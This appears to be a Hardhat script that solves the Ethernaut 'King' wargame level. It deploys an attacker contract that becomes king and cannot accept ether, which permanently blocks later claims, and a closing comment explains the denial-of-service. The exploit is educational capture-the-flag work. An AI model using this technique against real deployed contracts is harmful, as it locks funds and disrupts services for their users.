import { ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/9.King/King.sol/King.json";
import { BigNumber, Contract } from "ethers";
import { displayResult } from "../../utils/displayResult";
import { sendEther } from "../../utils/sendEther";

const targetAddress = "0x020f9e971cAE6cfE210BcAEDe42e0AC42E5E3353";

async function main() {
  const [attacker] = await ethers.getSigners();
  const target = new Contract(targetAddress, abi, attacker);
  const KingAttacker = await deployContract("KingAttacker", attacker, [
    target.address,
  ]);
  const prize = (await target.prize()) as BigNumber;
  const tx = await KingAttacker.attack({
    value: prize,
    gasLimit: "3000000",
  });
  await tx.wait();

  let secondTryFailed = false;
  try {
    await sendEther(
      attacker,
      target.address,
      ethers.utils.formatUnits(prize, 18)
    );
  } catch (e) {
    secondTryFailed = true;
  }
  const king = await target._king();
  displayResult(king === KingAttacker.address && secondTryFailed);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

// Explanation
/* 
The game can work only if the king can receive eth. If he can't then every receive
call will fail. We became king with a contract that doesn't have a receive function
nor a payable fallback.
No one can become king after us. We can't withdraw the prize.
 */
